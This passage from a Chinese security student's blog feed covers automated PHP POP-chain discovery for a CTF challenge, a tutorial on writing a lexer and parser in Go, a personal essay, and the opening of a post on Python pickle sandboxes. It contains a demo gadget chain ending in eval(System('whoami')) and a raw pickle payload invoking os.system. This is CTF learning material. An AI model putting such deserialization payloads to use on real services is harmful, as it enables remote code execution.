        <span class="k">if</span><span class="p">(</span><span class="nv">$stmt</span> <span class="k">instanceof</span> <span class="nc">Node\Stmt\Expression</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="n">expr</span> <span class="k">instanceof</span> <span class="nc">Node\Expr\MethodCall</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="n">expr</span> <span class="o">-&gt;</span> <span class="k">var</span> <span class="k">instanceof</span> <span class="nc">Node\Expr\PropertyFetch</span>
        <span class="p">){</span>
            <span class="nv">$call</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="n">expr</span> <span class="o">-&gt;</span> <span class="n">name</span> <span class="o">-&gt;</span> <span class="n">name</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$call</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>其实走到这，我们就拿到了pop链的路线，不过作者还写了一个<code class="language-plaintext highlighter-rouge">ParseClassVisitor</code>,可以通过最后一次遍历pop数组即可拿到序列化后的字符串。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211010231317.png" alt="" /></p>

<p>本来我以为这就结束了,直到我们看到了方法5，实在不得不惊叹师傅对问题的钻研精神。</p>

<p>简单来说，以下的情况：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">A</span> <span class="kd">extends</span> <span class="nc">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">FuncA</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">a</span><span class="o">-&gt;</span><span class="nf">FuncB</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">class</span> <span class="nc">B</span> <span class="kd">extends</span> <span class="nc">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">FuncB</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">b</span><span class="o">-&gt;</span><span class="nf">FuncC</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">class</span> <span class="nc">C</span> <span class="kd">extends</span> <span class="nc">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">FuncC</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nb">System</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$demo</span> <span class="o">=</span><span class="k">new</span> <span class="nc">A</span><span class="p">;</span>
<span class="nv">$demo</span><span class="o">-&gt;</span><span class="nf">FuncA</span><span class="p">();</span>
</code></pre></div></div>

<p>我们该怎么写Father类，当调用<code class="language-plaintext highlighter-rouge">$demo-&gt;FuncA();</code>,可以自动调用到eval里的函数。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span> <span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__call</span><span class="p">(</span><span class="nv">$funcName</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nb">get_declared_classes</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$index</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$index</span><span class="o">&gt;=</span><span class="mi">176</span><span class="p">){</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$value</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$obj</span><span class="p">,</span> <span class="nv">$funcName</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$obj</span><span class="o">-&gt;</span><span class="nv">$funcName</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">){}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样看，当调用<code class="language-plaintext highlighter-rouge">$this-&gt;a-&gt;FuncB();</code>,因为当前没有<code class="language-plaintext highlighter-rouge">a</code>属性，调用<code class="language-plaintext highlighter-rouge">__get</code>相当变成了<code class="language-plaintext highlighter-rouge">$this-&gt;FuncB()</code>,然后在<code class="language-plaintext highlighter-rouge">__call</code>中遍历所有类，找到有这个方法的类并以此反复调用下去。而如果要记录这样的一条pop链，只需要在<code class="language-plaintext highlighter-rouge">__get()</code>和<code class="language-plaintext highlighter-rouge">__call()</code>方法中做一些简单手脚即可。</p>

<p>不过虽然这样的方法看似自动帮我们生成了pop链，但是还是有一些弊端。因为作者实现已经用python正则完善了对数据流的优化，把很多变量名以及方法进行了替换。但在实际环境中想要自动化生成pop链我感觉还是很困难，毕竟数据流的动向实在是太复杂了。</p>

<p>总的来说还是感谢师傅分享了这样一篇文章，收获良多，也希望自己今后多总结思考，毕竟ctf的乐趣不也在于此吗？</p>

<p><strong>*参考</strong>：<a href="https://www.freebuf.com/articles/web/279680.html">pop_master的花式解题思路</a></p>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。]]></summary></entry><entry><title type="html">漫谈解释器</title><link href="http://localhost:4000/2021/09/19/talk-about-interpreter.html" rel="alternate" type="text/html" title="漫谈解释器" /><published>2021-09-19T22:24:32+08:00</published><updated>2021-09-19T22:24:32+08:00</updated><id>http://localhost:4000/2021/09/19/talk-about-interpreter</id><content type="html" xml:base="http://localhost:4000/2021/09/19/talk-about-interpreter.html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210901224626.png" alt="image-20210901150504552" /></p>

<h2 id="前言">前言</h2>

<p>开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。</p>

<!--more-->

<p>主要参考以下两本教材</p>

<ul>
  <li><a href="https://book.douban.com/subject/20436488/">编译器设计</a></li>
  <li><a href="https://interpreterbook.com/">Writing An Interpreter In Go</a></li>
</ul>

<h2 id="概述">概述</h2>

<h3 id="编译型语言">编译型语言</h3>

<p>有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序，比如C、c++、Golang等，这种编程语言称为编译型语言，使用的转换工具称为编译器。</p>

<h3 id="解释型语言">解释型语言</h3>

<p>有的编程语言可以一边执行一边转换，不会生成可执行程序，比如 JavaScript、PHP等。这种编程语言称为解释型语言，使用的转换工具称为解释器。</p>

<h3 id="编译解释">编译+解释</h3>

<p>严格意义上python不算是单纯的解释型语言，其还会编译为pyc字节码，由pvm解释执行这个字节码文件，每一次负责将一条字节码文件语句翻译成cpu可以直接执行的机器代码。</p>

<p>java从源代码编译为字节码，然后在JVM上运行字节码执行，JVM是一种字节码的解释器，JVM的实现包括一个运行时的编译器，称为JIT(just-in-time)编译器，其最大的优势在于<strong>可以在运行时进行及时优化</strong>。更多关于JIT的知识可参考<a href="https://aboullaite.me/understanding-jit-compiler-just-in-time-compiler/">这篇文章</a>.</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210901224636.png" alt="image-20210901173603017" /></p>

<p>在知乎看到一个很有意思的提问：</p>

<blockquote>
  <p>我之前看知乎上有人分析，编译型语言能够直接生成二进制代码（Windows下就是EXE或DLL吧），而解释型语言不会生成二进制代码，最多道二进制代码的前一步。</p>

  <p>我对这种解释有些无法理解，感觉这似乎不是他们的本质吧。Python是一个解释性语言，但我记得Python可以下载一个包，能够将Python直接编译为EXE可执行程序，难道说，我下载了这个包之后，Python就从解释型语言变为编译型语言了不成？</p>

  <p>是这个概念区分本身就有严重的先天缺陷，还是我的理解本身有错误？</p>
</blockquote>

<p>其中无论对与否，比较戳中我的回答：</p>

<blockquote>
  <p>语言只是规定语法，最后用这语言写出来的代码怎么翻译成机器码，怎么运行，还需要一个实现。这个实现可以是编译器也可以是解释器。</p>

  <p>所以你也可以做一个python的编译器或者C语言的解释器</p>
</blockquote>

<h2 id="编译器构成">编译器构成</h2>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210902230041.png" alt="image-20210902230038132" /></p>

<p>现在国内外大多教材(虽然我都没看过)在编译器这一块是头重脚轻的，比重前端»后端&gt;优化器，虽然对于编译器这样非常不合理，不过站在学习静态分析的方向，更多的关注点还是放在前端，当然优化部分也不可忽视，比如这个值得反复揣摩的<a href="https://www.zhihu.com/question/27730062/answer/44638989">问答</a>。</p>

<h3 id="前端">前端</h3>

<p>前端部分，其实现有很多工具已经帮我们实现了</p>

<h4 id="词法分析器">词法分析器</h4>

<p>源代码在计算机『眼中』其实是一团乱麻。无法被理解的字符串在计算器看来并没有什么区别，为了理解这些字符我们需要做的第一件事情就是<strong>将字符串分组</strong>，这能够降低理解字符串的成本，简化源代码的分析过程。所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 <strong>Token</strong> 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（<strong>lexer</strong>）。</p>

<p>对于词法分析器而言，最繁杂的一步，也就是需要我们把这门语言可能用到的token全部枚举出来</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">token</span>
<span class="k">const</span><span class="p">(</span>
	<span class="c">// Identifiers + literals</span>
	<span class="n">IDENT</span> <span class="o">=</span> <span class="s">"IDENT"</span> <span class="c">// add, foobar, x, y, ...</span>
	<span class="n">INT</span>   <span class="o">=</span> <span class="s">"INT"</span>   <span class="c">// 1343456</span>

	<span class="c">// Operators</span>
	<span class="n">ASSIGN</span>   <span class="o">=</span> <span class="s">"="</span>
	<span class="n">PLUS</span>     <span class="o">=</span> <span class="s">"+"</span>
  
  <span class="c">// Delimiters</span>
	<span class="n">COMMA</span>     <span class="o">=</span> <span class="s">","</span>
	<span class="n">SEMICOLON</span> <span class="o">=</span> <span class="s">";"</span>
	<span class="n">LPAREN</span> <span class="o">=</span> <span class="s">"("</span>
  
  <span class="c">// Keywords</span>
	<span class="n">FUNCTION</span> <span class="o">=</span> <span class="s">"FUNCTION"</span>
	<span class="n">LET</span>      <span class="o">=</span> <span class="s">"LET"</span>
	<span class="n">TRUE</span>     <span class="o">=</span> <span class="s">"TRUE"</span>
  <span class="o">......</span>
<span class="p">)</span>
</code></pre></div></div>

<p>我们采用类似解释器模式的python，逐行读取源文件，这里需要介绍两个函数</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">l</span> <span class="o">*</span><span class="n">Lexer</span><span class="p">)</span> <span class="n">readChar</span><span class="p">()</span> <span class="p">{}</span>
<span class="k">func</span> <span class="p">(</span><span class="n">l</span> <span class="o">*</span><span class="n">Lexer</span><span class="p">)</span> <span class="n">peekChar</span><span class="p">()</span> <span class="kt">byte</span> <span class="p">{}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">readChar</code>用于读取当前位置的字符，<code class="language-plaintext highlighter-rouge">peekChar</code>用于(看一眼)下个位置的字符，因为比如当读取到<code class="language-plaintext highlighter-rouge">=</code>时，无法断定token是赋值还是等于，需要通过下一个字符判断。</p>

<p>这里还有一个问题，我们如何判断一个变量呢，比如<code class="language-plaintext highlighter-rouge">let x = 3</code>,对于词法分析器而言<code class="language-plaintext highlighter-rouge">let</code>和<code class="language-plaintext highlighter-rouge">x</code> 是没有区别的，这里我们需要创建一个map</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">token</span>
<span class="k">var</span> <span class="n">keywords</span> <span class="o">=</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="n">TokenType</span><span class="p">{</span>
	<span class="s">"fn"</span><span class="o">:</span>     <span class="n">FUNCTION</span><span class="p">,</span>
	<span class="s">"let"</span><span class="o">:</span>    <span class="n">LET</span><span class="p">,</span>
	<span class="s">"true"</span><span class="o">:</span>   <span class="n">TRUE</span><span class="p">,</span>
	<span class="s">"false"</span><span class="o">:</span>  <span class="n">FALSE</span><span class="p">,</span>
	<span class="s">"if"</span><span class="o">:</span>     <span class="n">IF</span><span class="p">,</span>
	<span class="s">"else"</span><span class="o">:</span>   <span class="n">ELSE</span><span class="p">,</span>
	<span class="s">"return"</span><span class="o">:</span> <span class="n">RETURN</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">LookupIdent</span><span class="p">(</span><span class="n">ident</span> <span class="kt">string</span><span class="p">)</span> <span class="n">TokenType</span> <span class="p">{</span>
	<span class="k">if</span> <span class="n">tok</span><span class="p">,</span> <span class="n">ok</span> <span class="o">:=</span> <span class="n">keywords</span><span class="p">[</span><span class="n">ident</span><span class="p">];</span> <span class="n">ok</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">tok</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">IDENT</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样每次当我们读完一串字符串，就进行<code class="language-plaintext highlighter-rouge">LookupIdent</code>寻找是否含有键值。</p>

<p>最后反复调用一个<code class="language-plaintext highlighter-rouge">NextToken()</code>函数，其内部调用<code class="language-plaintext highlighter-rouge">readChar()</code>以及token判断，这样最简易的词法分析器就暂时完成。</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for</span> <span class="n">tok</span> <span class="o">:=</span> <span class="n">l</span><span class="o">.</span><span class="n">NextToken</span><span class="p">();</span> <span class="n">tok</span><span class="o">.</span><span class="n">Type</span> <span class="o">!=</span> <span class="n">token</span><span class="o">.</span><span class="n">EOF</span><span class="p">;</span> <span class="n">tok</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">NextToken</span><span class="p">()</span> <span class="p">{</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%+v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tok</span><span class="p">)</span>
		<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921114712.png" alt="image-20210921114710885" /></p>

<h4 id="语法分析器">语法分析器</h4>

<p>语法分析器就根据我们所定义的形式文法（<strong>Grammar</strong>）识别出词法分析所得到token的结构，从而构造出一颗语法树(<strong>AST</strong> abstract syntax tree),仅仅得到AST是不够的，还得对AST进行语义检查，保证其结构在语义上也是说得通的。</p>

<blockquote>
  <p>这一块真是看了好久才<del>看明白</del>,其实是英语太拉垮了，拿着源码调试反而好理解一些。</p>
</blockquote>

<p>拿最简单的<code class="language-plaintext highlighter-rouge">let</code>为例，<code class="language-plaintext highlighter-rouge">let</code>表达式通常是这样的：</p>

<div class="language-haskell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">let</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> 
<span class="kr">let</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span>
<span class="kr">let</span> <span class="n">add</span> <span class="o">=</span> <span class="n">fn</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> 
	<span class="n">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">};</span>
<span class="o">......</span>
<span class="kr">let</span> <span class="o">&lt;</span><span class="n">identifier</span><span class="o">&gt;</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span><span class="p">;</span>
</code></pre></div></div>

<p>在我们创建结点之前，我们需要明白<code class="language-plaintext highlighter-rouge">statements</code>和<code class="language-plaintext highlighter-rouge">expressions</code>的区别，这两者本质的区别在于是否会产生值，比如声明 <code class="language-plaintext highlighter-rouge">let x =5</code>并不会产生值，但是<code class="language-plaintext highlighter-rouge">5</code>会.<code class="language-plaintext highlighter-rouge">return 5</code>不会产生值而<code class="language-plaintext highlighter-rouge">add(5+5)</code>会。(怎么感觉越说越糊涂)简单来说<code class="language-plaintext highlighter-rouge">statements</code>就是一句完整的语句，而<code class="language-plaintext highlighter-rouge">expressions</code>像是c++中的右值，需要一个变量去接收。现在我们创建两种类型的结点：</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">ast</span>
<span class="c">// The base Node interface</span>
<span class="k">type</span> <span class="n">Node</span> <span class="k">interface</span> <span class="p">{</span>
	<span class="n">TokenLiteral</span><span class="p">()</span> <span class="kt">string</span>
	<span class="n">String</span><span class="p">()</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="c">// All statement nodes implement this</span>
<span class="k">type</span> <span class="n">Statement</span> <span class="k">interface</span> <span class="p">{</span>
	<span class="n">Node</span>
	<span class="n">statementNode</span><span class="p">()</span>
<span class="p">}</span>

<span class="c">// All expression nodes implement this</span>
<span class="k">type</span> <span class="n">Expression</span> <span class="k">interface</span> <span class="p">{</span>
	<span class="n">Node</span>
	<span class="n">expressionNode</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></div></div>

<p>有了接口以后，我们需要为语法🌲创建一个根结点，</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">type</span> <span class="n">Program</span> <span class="k">struct</span> <span class="p">{</span>
	<span class="n">Statements</span> <span class="p">[]</span><span class="n">Statement</span>
<span class="p">}</span>

<span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="o">*</span><span class="n">Program</span><span class="p">)</span> <span class="n">TokenLiteral</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">Statements</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">0</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">Statements</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">TokenLiteral</span><span class="p">()</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">""</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>如果想把简单的let语句化为一颗AST,差不多是下面这样：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921165139.png" alt="image-20210921165137173" /></p>

<p>那<code class="language-plaintext highlighter-rouge">LetStatement</code>的雏形差不多有了：</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">type</span> <span class="n">LetStatement</span> <span class="k">struct</span> <span class="p">{</span>
   <span class="n">Token</span> <span class="n">token</span><span class="o">.</span><span class="n">Token</span> <span class="c">// the token.LET token</span>
   <span class="n">Name</span>  <span class="o">*</span><span class="n">Identifier</span>
   <span class="n">Value</span> <span class="n">Expression</span>
<span class="p">}</span>
</code></pre></div></div>

<p>那么当我们读到一个token为let，就可以进入对let的解析函数</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="o">*</span><span class="n">Parser</span><span class="p">)</span> <span class="n">parseLetStatement</span><span class="p">()</span> <span class="o">*</span><span class="n">ast</span><span class="o">.</span><span class="n">LetStatement</span> <span class="p">{</span>	<span class="n">stmt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">ast</span><span class="o">.</span><span class="n">LetStatement</span><span class="p">{</span><span class="n">Token</span><span class="o">:</span> <span class="n">p</span><span class="o">.</span><span class="n">curToken</span><span class="p">}</span>	<span class="k">if</span> <span class="o">!</span><span class="n">p</span><span class="o">.</span><span class="n">expectPeek</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">IDENT</span><span class="p">)</span> <span class="p">{</span>		<span class="k">return</span> <span class="no">nil</span>	<span class="p">}</span>	<span class="n">stmt</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ast</span><span class="o">.</span><span class="n">Identifier</span><span class="p">{</span><span class="n">Token</span><span class="o">:</span> <span class="n">p</span><span class="o">.</span><span class="n">curToken</span><span class="p">,</span> <span class="n">Value</span><span class="o">:</span> <span class="n">p</span><span class="o">.</span><span class="n">curToken</span><span class="o">.</span><span class="n">Literal</span><span class="p">}</span>	<span class="k">if</span> <span class="o">!</span><span class="n">p</span><span class="o">.</span><span class="n">expectPeek</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">ASSIGN</span><span class="p">)</span> <span class="p">{</span>		<span class="k">return</span> <span class="no">nil</span>	<span class="p">}</span>	<span class="n">p</span><span class="o">.</span><span class="n">nextToken</span><span class="p">()</span>	<span class="n">stmt</span><span class="o">.</span><span class="n">Value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">parseExpression</span><span class="p">(</span><span class="n">LOWEST</span><span class="p">)</span>	<span class="k">if</span> <span class="n">p</span><span class="o">.</span><span class="n">peekTokenIs</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">SEMICOLON</span><span class="p">)</span> <span class="p">{</span>		<span class="n">p</span><span class="o">.</span><span class="n">nextToken</span><span class="p">()</span>	<span class="p">}</span>	<span class="k">return</span> <span class="n">stmt</span><span class="p">}</span>
</code></pre></div></div>

<p>比如对于<code class="language-plaintext highlighter-rouge">let x =5</code>, 可以得到</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921170351.png" alt="image-20210921170349884" /></p>

<p>上面的例子的expression只是5，但比如<code class="language-plaintext highlighter-rouge">let x = 3+2*5</code>这种的表达式更为复杂，书中用到的方法叫<strong>Top Down Operator Precedence</strong>,或者<strong>Pratt Parsin</strong>。这里就不过多阐述，详细可参考<a href="https://tdop.github.io/">原文章</a>.</p>

<p>这样对于复杂表达式，我们也能解析：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921171859.png" alt="image-20210921171857411" /></p>

<h3 id="优化器">优化器</h3>

<p>代码部分并没有着重优化，书上理论部分实属抽象😭，但这其实又是静态分析中最重要的环节，容我学习学习……</p>

<h3 id="后端">后端</h3>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[前言 开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。]]></summary></entry><entry><title type="html">something0x02</title><link href="http://localhost:4000/2021/08/17/%E9%9A%8F%E7%AC%940x02.html" rel="alternate" type="text/html" title="something0x02" /><published>2021-08-17T23:55:32+08:00</published><updated>2021-08-17T23:55:32+08:00</updated><id>http://localhost:4000/2021/08/17/%E9%9A%8F%E7%AC%940x02</id><content type="html" xml:base="http://localhost:4000/2021/08/17/%E9%9A%8F%E7%AC%940x02.html"><![CDATA[<!--more-->

<p>还是想还是写点什么，但不知道该怎么下笔。</p>

<p>对朋友而言，我算是一个倾诉欲望很强的人，不管是开心的事情也好，伤心的也罢。但如果真的记录下来，好像就都会变成比较丧，尽管我认为自己是一个比较乐观的人，我也希望可以给身边的人带来快乐，所以就会变得有些许矛盾。</p>

<p>实习这几天，晚上睡觉经常一直胡思乱想，为什么我会坚持做一些事情。</p>

<p>为什么我要写博客，可能刚开始看到了很多师傅，学长都有博客，心想如果我学着写会不会变成像他们这样厉害的人呢？到后来应该是大家都开始记录，有时候看到别人的访问或者评论还会暗暗的开心。</p>

<p>为什么我要打比赛呢，感觉<del>—–</del></p>

<p>为什么我要学习安全。换在一年前，或者半年前，我一定会毫不犹豫的说，我喜欢。但在我打下这几个字的时候，我感到很焦虑。直到现在我都没有怀疑过我的初心，但我无法保证是是否还能坚守初衷。就好像写文章，变成了我更希望别人看到怎样的我，而不是我现在到底怎样。复现题目，也从之前的不求甚解，变成了 :<code class="language-plaintext highlighter-rouge">哦就这样啊，那下次注意</code>。如果说做的这么多都变成了刻意，那我应该得好好反思关于未来的事情。</p>

<p>也有可能是闲的慌了，容易胡思乱想，我更加能接受这个理由。至少在学校，和朋友们在一起，好像时间会慢很多，大家也不会去规划太多关于未来的事情。在家里有我那粘人的弟弟天天烦着我，每天乐呵乐呵也就过去了。哦对了提一嘴，弟弟的小升初成绩十分不错，让他狠狠的骄傲了一会，行吧，这六年来被我和爸妈三个人教训也挺幸苦的，发工资了就奖赏他一会，不过好像他更希望我能回家。</p>

<p>工作还是挺累的，自认为晚上回来还能学一些其他的知识，事实上是我想多了。偶然的机会，又重新读了读《山河之书》，不得不说，高中读这本书，和现在完全是不同的感觉。高中仅仅是欣赏他的文笔，但不喜欢他的思想，也可能是对应试教育的厌烦，总觉得能从景点中品出那么多感情的人很矫情，但现在又不一样。偶尔的共鸣也是可以接受的，许多风景，也会不自禁的带入不同的人随行，感觉很奇妙。</p>

<p>前几天看到通知说江苏最早15号返校，本来也和我没什么关系，实习的话最早好像也得20号走吧，但谈到学校还是会有一些触动，可能是学校里有让自己挂念的人，也可能是还没有提前适应社会的洗礼。不过现在实习的工作也挺nice，组长和学长都挺照顾的。</p>

<p>是随笔的话，也就这样零零散散的写吧，应该哪天觉得幼稚就删了。</p>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">pickle</title><link href="http://localhost:4000/2021/08/14/pickle.html" rel="alternate" type="text/html" title="pickle" /><published>2021-08-14T23:30:20+08:00</published><updated>2021-08-14T23:30:20+08:00</updated><id>http://localhost:4000/2021/08/14/pickle</id><content type="html" xml:base="http://localhost:4000/2021/08/14/pickle.html"><![CDATA[<!--more-->

<p> 相关介绍看<a href="https://docs.python.org/zh-cn/3/library/pickle.html">手册</a>就行，写的不能再详细。</p>

<p>那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？</p>

<p>毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">builtins</span>
<span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">pickle</span>

<span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'range'</span><span class="p">,</span>
    <span class="s">'complex'</span><span class="p">,</span>
    <span class="s">'set'</span><span class="p">,</span>
    <span class="s">'frozenset'</span><span class="p">,</span>
    <span class="s">'slice'</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="n">Unpickler</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="c1"># Only allow safe classes from builtins.
</span>        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s">"builtins"</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_builtins</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="c1"># Forbid everything else.
</span>        <span class="k">raise</span> <span class="n">pickle</span><span class="p">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s">"global '%s.%s' is forbidden"</span> <span class="o">%</span>
                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="s">"""Helper function analogous to pickle.loads()."""</span>
    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">)).</span><span class="n">load</span><span class="p">()</span>

<span class="n">test</span><span class="o">=</span> <span class="sa">b</span><span class="s">"cos</span><span class="se">\n</span><span class="s">system</span><span class="se">\n</span><span class="s">(S'echo hello world'</span><span class="se">\n</span><span class="s">tR."</span>
<span class="n">restricted_loads</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>其中这里重写了<code class="language-plaintext highlighter-rouge">find_class</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png" alt="image-20210815152312283" /></p>

<p>对<strong>module</strong>限制为<strong>builtins</strong>,并且只允许<strong>safe_builtins</strong>。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🌀  pickle  python3 main.py
